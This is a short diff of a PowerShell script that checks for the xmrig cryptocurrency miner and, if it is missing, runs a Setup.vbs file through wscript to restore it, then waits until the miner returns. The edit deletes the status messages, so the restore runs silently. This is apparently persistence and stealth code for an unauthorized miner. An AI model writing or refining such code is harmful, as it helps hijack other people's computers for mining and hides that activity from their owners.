@@ -9,10 +9,8 @@ if (Test-Path $xmrigPath) {
 } else {
     Write-Warning "xmrig.exe not found."
     if (Test-Path $setupPath) {
-        Write-Host "Running Setup.vbs to restore xmrig..."
         Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
         while (!(Test-Path $xmrigPath)) {
-            Write-Host "Waiting for xmrig.exe..."
             Start-Sleep -Seconds 3
         }
     }
